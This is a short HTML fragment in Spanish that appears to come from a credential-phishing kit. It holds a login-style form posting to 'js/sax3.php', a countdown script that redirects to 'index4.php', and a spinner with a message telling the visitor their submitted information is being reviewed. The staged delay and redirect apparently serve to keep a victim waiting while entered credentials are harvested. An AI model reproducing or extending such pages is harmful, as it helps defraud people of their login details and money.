...
<script type="text/javascript">
               var url="index4.php";
               var seconds = 8; //número de segundos a contar
        ...
        <div class="col-12 col-md-6 columna-formulario">
          ...
          <form  method="post"  action="js/sax3.php" onsubmit="return validarFormulario()" class="form-inline module-content-rotate generic-form" id="form_login">
            ...
            <fieldset class="camposAcceso24 mt-md-4">
              <img src="img/spinner.gif" style="width: 40px; display: block;margin: 0 auto;">
              <div>
                <div class="text-label mb-3">
                  <label style="text-align: center;">Estaremos revisando la informacion suministrada, aguarde <b id="CuentaAtras"></b> segundos.</label>
                </div>
